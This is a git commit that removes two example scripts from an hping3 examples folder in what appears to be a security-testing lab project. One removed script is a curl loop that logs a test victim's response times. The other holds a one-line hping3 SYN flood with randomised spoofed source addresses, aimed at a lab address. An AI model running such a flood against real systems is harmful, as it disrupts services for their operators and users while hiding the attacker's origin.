9b9eeb462193c0cf8014f671c3a3336aab43f9f6
SVO <svo@qual.is>
2025-03-09 15:10:08 +1100

    Removing hping3 example that does not show result with new configuration

--- examples/hping3/monitor.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-true > report.log
-
-while true; do
-  curl -I --silent --head -o /dev/null -w "%{http_code} - %{time_total}\n" "http://security-testing-victim.local:3000" 2>&1 | tee -a report.log
-done
--- examples/hping3/run.sh
+++
@@ -1,3 +0,0 @@
-#!/bin/bash
-
-sudo hping3 --rand-source 10.6.6.7 --flood -S -L 0 -p 3000
